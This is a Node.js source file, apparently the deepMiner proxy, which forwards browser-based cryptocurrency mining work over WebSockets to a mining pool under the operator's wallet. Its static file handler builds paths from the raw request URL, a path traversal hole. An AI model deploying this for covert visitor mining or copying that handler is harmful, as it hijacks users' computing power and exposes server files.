const cfg = global.cfg = require('./config');

const http = require('http');
const https = require('https');
const WebSocket = require('uws');
const net = require('net');
const fs = require('fs');
const crypto = require('crypto');

const readFilePromise = async (...opts) => {
	return new Promise((go, stop) => {
		fs.readFile(...opts, (e, data) => {
			if (e) return stop(e);
			return go(data);
		});
	});
};

const stats = (req, res) => {
	res.setHeader('Access-Control-Allow-Origin', '*');
	if (req.url === '/') req.url = '/public/index.html';
	if (req.url === '/demo') req.url = '/public/demo.html';

	readFilePromise(`${__dirname}/web${req.url}`).then((buf) => {
		if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
			if (req.url.match(/\.js$/)) res.setHeader('Content-Type', 'application/javascript');
		} else {
			res.setHeader('Content-Type', 'application/wasm');
		};
		res.end(buf);
	}).catch(async (e) => {
		try {
			res.end(await readFilePromise(`${cfg.webRoot}/404.html`));
		} catch (e2) {};
	});
};

let server = cfg.ssl.enabled ? https.createServer({
	key: cfg.ssl.key,
	cert: cfg.ssl.cert
}, stats) : http.createServer(stats);

let wsServer = new WebSocket.Server(Object.assign({}, cfg.uws.serverOpts, { server }));
wsServer.on('connection', (ws) => {
	let conn = {
		uid: null,
		pid: crypto.randomBytes(12).toString('hex'),
		workerId: null,
		found: 0,
		accepted: 0,
		ws,
		pl: new net.Socket(),
	};
	let pool = cfg.conn.pool.split(':');
	conn.pl.connect(pool[1], pool[0]);

	const ws2pool = async (data) => {
		let buf;
		data = JSON.parse(data);
		if (data.type === 'auth') {
			conn.uid = data.params.site_key;
			if (data.params.user) conn.uid += '@' + data.params.user;
			buf = {
				"method": "login",
				"params": {
					"login": cfg.conn.wallet,
					"pass": cfg.conn.poolpass,
					"agent": "deepMiner"
				},
				"id": conn.pid
			};
			buf = `${JSON.stringify(buf)}\n`;
			conn.pl.write(buf);
		} else if (data.type === 'submit') {
			conn.found++;
			buf = {
				"method": "submit",
				"params": {
					"id": conn.workerId,
					"job_id": data.params.job_id,
					"nonce": data.params.nonce,
					"result": data.params.result
				},
				"id": conn.pid
			};
			buf = `${JSON.stringify(buf)}\n`;
			conn.pl.write(buf);
		};
	};

	const pool2ws = async (data) => {
		try {
			let buf;
			data = JSON.parse(data);
			if (data.id === conn.pid && data.result) {
				if (data.result.id) {
					conn.workerId = data.result.id;
					buf = {
						"type": "authed",
						"params": {
							"token": "",
							"hashes": conn.accepted
						},
					};
					buf = JSON.stringify(buf);
					conn.ws.send(buf);
					buf = {
						"type": "job",
						"params": data.result.job
					};
					buf = JSON.stringify(buf);
					conn.ws.send(buf);
				} else if (data.result.status === 'OK') {
					conn.accepted++;
					buf = {
						"type": "hash_accepted",
						"params": {
							"hashes": conn.accepted
						},
					};
					buf = JSON.stringify(buf);
					conn.ws.send(buf);
				};
			};
			if (data.id === conn.pid && data.error) {
				if (data.error.code === -1) {
					buf = {
						"type": "banned",
						"params": {
							"banned": conn.pid
						},
					};
				} else {
					buf = {
						"type": "error",
						"params": {
							"error": data.error.message
						},
					};
				};
				buf = JSON.stringify(buf);
				conn.ws.send(buf);
			};
			if (data.method === 'job') {
				buf = {
					"type": 'job',
					"params": data.params
				};
				buf = JSON.stringify(buf);
				conn.ws.send(buf);
			};
		} catch (e) {
			console.warn(`[!] Error: ${e.message}`);
		};
	};

	conn.ws.on('message', async (data) => {
		await ws2pool(data);
		console.log(`[>] Request: ${conn.uid}\n\n${data}\n`);
	});
	conn.ws.on('error', (data) => {
		console.log(`[!] ${conn.uid} WebSocket ${data}\n`);
		conn.pl.destroy();
	});
	conn.ws.on('close', () => {
		console.log(`[!] ${conn.uid} offline.\n`);
		conn.pl.destroy();
	});
	conn.pl.on('data', async (data) => {
		let linesdata = data;
		let lines = String(linesdata).split("\n");
		if (lines[1].length > 0) {
			console.log(`[<] Response: ${conn.pid}\n\n${lines[0]}\n`);
			console.log(`[<] Response: ${conn.pid}\n\n${lines[1]}\n`);
			await pool2ws(lines[0]);
			await pool2ws(lines[1]);
		} else {
			console.log(`[<] Response: ${conn.pid}\n\n${data}\n`);
			await pool2ws(data);
		};
	});
	conn.pl.on('error', (data) => {
		console.log(`PoolSocket ${data}\n`);
		if (conn.ws.readyState !== 3) conn.ws.close();
	});
	conn.pl.on('close', () => {
		console.log('PoolSocket Closed.\n');
		if (conn.ws.readyState !== 3) conn.ws.close();
	});
});

server.listen(cfg.server.port, cfg.server.domain, () => {
	console.log(` Listen on : ${cfg.server.domain}:${cfg.server.port}\n Pool Host : ${cfg.conn.pool}\n Wallet : ${cfg.conn.wallet}\n`);
	console.log('----------------------------------------------------------------------------------------\n');
});